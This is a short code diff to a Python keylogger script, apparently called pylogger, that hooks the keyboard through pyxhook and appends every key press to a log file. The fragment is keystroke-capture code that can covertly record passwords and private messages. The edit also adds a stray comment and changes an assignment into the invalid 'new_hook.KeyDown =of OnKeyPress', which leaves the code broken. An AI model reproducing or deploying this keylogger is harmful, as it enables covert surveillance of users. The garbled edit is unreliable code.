@@ -25,7 +25,7 @@ if os.environ.get('pylogger_clean', None) is not None:
 	except EnvironmentError:
 	# File does not exist, or no permissions.
 		pass
-
+#creating a new key
 #creating key pressing event and saving it into log file
 def OnKeyPress(event):
 	with open(log_file, 'a') as f:
@@ -33,7 +33,7 @@ def OnKeyPress(event):
 
 # create a hook manager object
 new_hook = pyxhook.HookManager()
-new_hook.KeyDown = OnKeyPress
+new_hook.KeyDown =of OnKeyPress
 # set the hook
 new_hook.HookKeyboard()
 try:
